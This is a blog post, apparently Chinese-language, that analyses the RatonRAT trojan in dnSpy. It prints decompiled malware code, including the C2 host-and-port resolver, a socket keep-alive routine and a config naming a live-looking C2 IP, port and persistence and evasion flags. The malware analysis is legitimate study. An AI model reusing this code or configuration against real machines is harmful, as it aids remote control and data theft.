---
title: RatonRAT
date: 2026-04-21 21:54:13
categories:
  - 样本分析
tags:
  - 木马
  - RatonRAT
---

# RatonRAT

今天来分析一个基本的木马

了解了一下先在市面上的木马一般都是用c#写的所以用dnSpy分析

![image-20260421215826092](https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260421215826092.png)

首先要找到木马逻辑

在这个目录上可以看见系统文件和dnSpy的信息文件而主要逻辑是在client中

![image-20260421215956793](https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260421215956793.png)

展开client可以看见

其中Client.Raton是这个木马的主要逻辑

costura是用来将dll整合成exe文件

至于cilent.praperties是系统自动生成的不用理会

![image-20260421220953053](https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260421220953053.png)

在supervisor下有这这个木马的关键函数

```cc
private Task InfoStuff()
{
	Supervisor.<InfoStuff>d__21 <InfoStuff>d__;
	<InfoStuff>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
	<InfoStuff>d__.<>4__this = this;
	<InfoStuff>d__.<>1__state = -1;
	<InfoStuff>d__.<>t__builder.Start<Supervisor.<InfoStuff>d__21>(ref <InfoStuff>d__);
	return <InfoStuff>d__.<>t__builder.Task;
}

```

这个函数调用了异步函数使木马可以在后台运行来窃取电脑信息

```c#
// Client.Raton.Supervisor
// Token: 0x06000076 RID: 118 RVA: 0x00008AC8 File Offset: 0x00006CC8
private void ResolveHostAndPort(out string host, out int port)
{
	host = Config.ht;
	port = Config.pt;
	if (string.IsNullOrWhiteSpace(host))
	{
		return;
	}
	string text = host.Trim();
	if (text.StartsWith("http://", StringComparison.OrdinalIgnoreCase))
	{
		text = text.Substring(7);
	}
	else if (text.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
	{
		text = text.Substring(8);
	}
	int num = text.LastIndexOf(':');
	if (num > 0 && num < text.Length - 1)
	{
		string text2 = text.Substring(0, num);
		int num2;
		if (int.TryParse(text.Substring(num + 1), out num2))
		{
			host = text2;
			port = num2;
		}
	}
}
```

这个函数获取了黑客的ip等信息

```c#
// Client.Raton.Supervisor
// Token: 0x06000074 RID: 116 RVA: 0x000089C4 File Offset: 0x00006BC4
private static void SetKeepAlive(Socket socket, uint timeMs, uint intervalMs)
{
	byte[] array = new byte[12];
	BitConverter.GetBytes(1U).CopyTo(array, 0);
	BitConverter.GetBytes(timeMs).CopyTo(array, 4);
	BitConverter.GetBytes(intervalMs).CopyTo(array, 8);
	socket.IOControl((IOControlCode)((ulong)-1744830460), array, null);
}

```

这个函数让木马保持活性

```c#
using System;

// Token: 0x02000006 RID: 6
internal class Config
{
	// Token: 0x04000022 RID: 34
	public static string Version = "v3.5.0";

	// Token: 0x04000023 RID: 35
	public static string Mutex = "qkoxcbwHaoFUf4En5LVdu9W";

	// Token: 0x04000024 RID: 36
	public static int pt = Convert.ToInt32("4890");

	// Token: 0x04000025 RID: 37
	public static string ht = "170.205.31.216";

	// Token: 0x04000026 RID: 38
	public static bool Startup = Convert.ToBoolean("true");

	// Token: 0x04000027 RID: 39
	public static int Delay = Convert.ToInt32("0");

	// Token: 0x04000028 RID: 40
	public static bool ProcessCritical = Convert.ToBoolean("false");

	// Token: 0x04000029 RID: 41
	public static bool HideFile = Convert.ToBoolean("false");

	// Token: 0x0400002A RID: 42
	public static bool Box = Convert.ToBoolean("false");

	// Token: 0x0400002B RID: 43
	public static string BoxMsg = "Hello, i'm the description of your raton client message box";

	// Token: 0x0400002C RID: 44
	public static string BoxIcon = "No icon";

	// Token: 0x0400002D RID: 45
	public static bool UAC = Convert.ToBoolean("false");

	// Token: 0x0400002E RID: 46
	public static bool Assist = false;

	// Token: 0x0400002F RID: 47
	public static bool OpenWebsite = Convert.ToBoolean("false");

	// Token: 0x04000030 RID: 48
	public static string Website = "https://t.me/sillyisafed";

	// Token: 0x04000031 RID: 49
	public static bool VM = Convert.ToBoolean("false");

	// Token: 0x04000032 RID: 50
	public static string Tag = "Infected";

	// Token: 0x04000033 RID: 51
	public static string BoxTit = "Hello, im a title for your message box";

	// Token: 0x04000034 RID: 52
	public static bool HidProc = Convert.ToBoolean("false");

	// Token: 0x04000035 RID: 53
	public static bool UACBy = false;

	// Token: 0x04000036 RID: 54
	public static string Password = "";

	// Token: 0x04000037 RID: 55
	public static string Raw = "silly21";

	// Token: 0x04000038 RID: 56
	public static int Reconnect = Convert.ToInt32("3");

	// Token: 0x04000039 RID: 57
	public static bool Defender = Convert.ToBoolean("false");
}
```

这个类里包含了服务器的所有内容
